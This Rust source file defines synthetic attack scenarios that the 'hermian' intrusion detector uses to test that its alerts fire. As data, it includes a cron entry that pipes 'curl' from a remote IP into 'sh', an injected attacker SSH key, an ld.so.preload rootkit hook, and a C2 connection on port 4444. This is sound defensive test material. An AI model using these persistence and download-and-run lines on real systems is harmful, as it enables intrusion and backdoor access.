//! Synthetic attack scenarios run through a fresh engine. Used by `hermian test`
//! to prove the detection pipeline works end to end on the installed binary,
//! and to show the operator what a real alert looks like.

use chrono::{DateTime, Duration, Utc};
use std::collections::HashMap;
use std::net::IpAddr;

use crate::alert::Alert;
use crate::allowlist::Allowlist;
use crate::baseline::Baseline;
use crate::config::Config;
use crate::engine::Engine;
use crate::events::*;

pub struct SelfTestResult {
    pub name: &'static str,
    pub detection: DetectionId,
    pub expected: Severity,
    pub pass: bool,
    pub detail: String,
    pub sample_alert: Option<Alert>,
}

fn fresh_engine() -> Engine {
    let cfg = Config::default();
    let allowlist = Allowlist::default();
    let baseline = Baseline::new(false, 24, Utc::now());
    let mut eng = Engine::new(cfg, allowlist, baseline, "selftest".into());
    let mut users = HashMap::new();
    users.insert(33, "www-data".to_string());
    users.insert(0, "root".to_string());
    users.insert(1000, "dev".to_string());
    eng.set_user_names(users);
    let t = Utc::now();
    eng.process(exec(t, 1, 0, 0, "systemd", "/usr/lib/systemd/systemd"));
    eng
}

fn exec(ts: DateTime<Utc>, pid: u32, ppid: u32, uid: u32, comm: &str, exe: &str) -> Event {
    Event::Exec(ExecEvent {
        ts,
        pid,
        ppid,
        uid,
        gid: uid,
        comm: comm.into(),
        exe: exe.into(),
        argv0: exe.into(),
        ld_preload: false,
        deleted_exe: false,
        tty_nr: 0,
        container: false,
        container_id: None,
    })
}

fn file(path: &str, kind: FileKind, writer: Option<WriterInfo>, content: Option<&str>) -> Event {
    Event::File(FileEvent {
        ts: Utc::now(),
        path: path.into(),
        kind,
        dev: 0,
        ino: 0,
        writer,
        session_present: false,
        is_suid: false,
        has_file_caps: false,
        content: content.map(str::to_string),
        container: false,
        managed_by_package: None,
    })
}

struct Scenario {
    name: &'static str,
    detection: DetectionId,
    expected: Severity,
    run: fn() -> Vec<Alert>,
}

fn scenario_webshell_rce() -> Vec<Alert> {
    let mut eng = fresh_engine();
    let t = Utc::now();
    eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
    eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
    eng.process(exec(t, 300, 200, 33, "curl", "/usr/bin/curl"));
    eng.process(exec(t, 400, 300, 33, "sh", "/tmp/.x.sh"))
}

fn scenario_ssh_key_injection() -> Vec<Alert> {
    let mut eng = fresh_engine();
    let t = Utc::now();
    eng.process(exec(t, 400, 1, 0, "cron", "/usr/sbin/cron"));
    eng.process(file(
        "/home/dev/.ssh/authorized_keys",
        FileKind::Modified,
        Some(WriterInfo {
            pid: 400,
            uid: 0,
            comm: "cron".into(),
            exe: "/usr/sbin/cron".into(),
            tty_nr: 0,
        }),
        Some("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@evil\n"),
    ))
}

fn scenario_cron_persistence() -> Vec<Alert> {
    let mut eng = fresh_engine();
    eng.process(file(
        "/etc/cron.d/.backdoor",
        FileKind::Created,
        None,
        Some("* * * * * root curl -s http://198.51.100.42/x.sh | sh\n"),
    ))
}

fn scenario_ld_preload() -> Vec<Alert> {
    let mut eng = fresh_engine();
    eng.process(file(
        "/etc/ld.so.preload",
        FileKind::Modified,
        None,
        Some("/tmp/libhide.so\n"),
    ))
}

fn scenario_systemd_persistence() -> Vec<Alert> {
    let mut eng = fresh_engine();
    eng.process(file(
        "/etc/systemd/system/update-helper.service",
        FileKind::Created,
        None,
        Some("[Service]\nExecStart=/dev/shm/.u\n[Install]\nWantedBy=multi-user.target\n"),
    ))
}

fn scenario_bruteforce() -> Vec<Alert> {
    let mut eng = fresh_engine();
    let t = Utc::now();
    let ip: IpAddr = "198.51.100.66".parse().unwrap();
    let mut out = Vec::new();
    for i in 0..6 {
        out.extend(eng.process(Event::Auth(AuthEvent {
            ts: t + Duration::seconds(i),
            result: AuthResult::Failure,
            user: "root".into(),
            rhost: Some(ip),
            service: "sshd".into(),
            tty: "ssh".into(),
        })));
    }
    out
}

fn scenario_fileless_memfd() -> Vec<Alert> {
    let mut eng = fresh_engine();
    let t = Utc::now();
    eng.process(exec(t, 600, 1, 1000, "python3", "/usr/bin/python3"));
    eng.process(Event::Exec(ExecEvent {
        ts: t,
        pid: 700,
        ppid: 600,
        uid: 1000,
        gid: 1000,
        comm: "3".into(),
        exe: "/memfd:payload (deleted)".into(),
        argv0: "/proc/self/fd/3".into(),
        ld_preload: false,
        deleted_exe: true,
        tty_nr: 0,
        container: false,
        container_id: None,
    }))
}

fn scenario_suid_drop() -> Vec<Alert> {
    let mut eng = fresh_engine();
    let mut ev = FileEvent {
        ts: Utc::now(),
        path: "/tmp/.rootme".into(),
        kind: FileKind::Created,
        dev: 0,
        ino: 0,
        writer: Some(WriterInfo {
            pid: 800,
            uid: 1000,
            comm: "cp".into(),
            exe: "/usr/bin/cp".into(),
            tty_nr: 0,
        }),
        session_present: false,
        is_suid: true,
        has_file_caps: false,
        content: None,
        container: false,
        managed_by_package: None,
    };
    ev.is_suid = true;
    eng.process(Event::File(ev))
}

fn scenario_c2_from_flagged_chain() -> Vec<Alert> {
    let mut eng = fresh_engine();
    let t = Utc::now();
    eng.process(exec(t, 100, 1, 33, "nginx", "/usr/sbin/nginx"));
    eng.process(exec(t, 200, 100, 33, "bash", "/usr/bin/bash"));
    eng.process(Event::Connect(ConnectEvent {
        ts: t,
        pid: 200,
        uid: 33,
        daddr: "198.51.100.42".parse().unwrap(),
        dport: 4444,
        comm: "bash".into(),
        container: false,
    }))
}

const SCENARIOS: &[Scenario] = &[
    Scenario {
        name: "Web shell RCE chain (nginx > bash > curl > exec)",
        detection: DetectionId::D1,
        expected: Severity::Critical,
        run: scenario_webshell_rce,
    },
    Scenario {
        name: "Fileless execution from memfd",
        detection: DetectionId::D1,
        expected: Severity::High,
        run: scenario_fileless_memfd,
    },
    Scenario {
        name: "SSH brute-force burst",
        detection: DetectionId::D2,
        expected: Severity::High,
        run: scenario_bruteforce,
    },
    Scenario {
        name: "SSH key planted with no session",
        detection: DetectionId::D3,
        expected: Severity::High,
        run: scenario_ssh_key_injection,
    },
    Scenario {
        name: "Cron job that downloads and runs remote code",
        detection: DetectionId::D3,
        expected: Severity::Critical,
        run: scenario_cron_persistence,
    },
    Scenario {
        name: "systemd unit executing from /dev/shm",
        detection: DetectionId::D3,
        expected: Severity::Critical,
        run: scenario_systemd_persistence,
    },
    Scenario {
        name: "ld.so.preload rootkit hook",
        detection: DetectionId::D3,
        expected: Severity::Critical,
        run: scenario_ld_preload,
    },
    Scenario {
        name: "setuid binary dropped in /tmp",
        detection: DetectionId::D4,
        expected: Severity::Critical,
        run: scenario_suid_drop,
    },
    Scenario {
        name: "C2 connection from a flagged chain",
        detection: DetectionId::D5,
        expected: Severity::High,
        run: scenario_c2_from_flagged_chain,
    },
];

pub fn run_selftests() -> Vec<SelfTestResult> {
    SCENARIOS
        .iter()
        .map(|s| {
            let alerts = (s.run)();
            // First alert at the highest severity: detection order puts the most
            // specific rule first, which is the best sample to show.
            let max = alerts
                .iter()
                .filter(|a| a.detection == s.detection && a.severity >= s.expected)
                .map(|a| a.severity)
                .max();
            let hit = max.and_then(|m| {
                alerts
                    .iter()
                    .find(|a| a.detection == s.detection && a.severity == m)
                    .cloned()
            });
            match hit {
                Some(a) => SelfTestResult {
                    name: s.name,
                    detection: s.detection,
                    expected: s.expected,
                    pass: true,
                    detail: format!("{} {}", a.severity, a.title),
                    sample_alert: Some(a),
                },
                None => SelfTestResult {
                    name: s.name,
                    detection: s.detection,
                    expected: s.expected,
                    pass: false,
                    detail: format!(
                        "expected {} {} or higher; got {}",
                        s.detection.short(),
                        s.expected,
                        if alerts.is_empty() {
                            "no alerts".to_string()
                        } else {
                            alerts
                                .iter()
                                .map(|a| format!("{} {}", a.detection.short(), a.severity))
                                .collect::<Vec<_>>()
                                .join(", ")
                        }
                    ),
                    sample_alert: None,
                },
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn all_selftests_pass() {
        let results = run_selftests();
        let failed: Vec<String> = results
            .iter()
            .filter(|r| !r.pass)
            .map(|r| format!("{}: {}", r.name, r.detail))
            .collect();
        assert!(
            failed.is_empty(),
            "failed scenarios:\n{}",
            failed.join("\n")
        );
        assert_eq!(results.len(), SCENARIOS.len());
    }
}
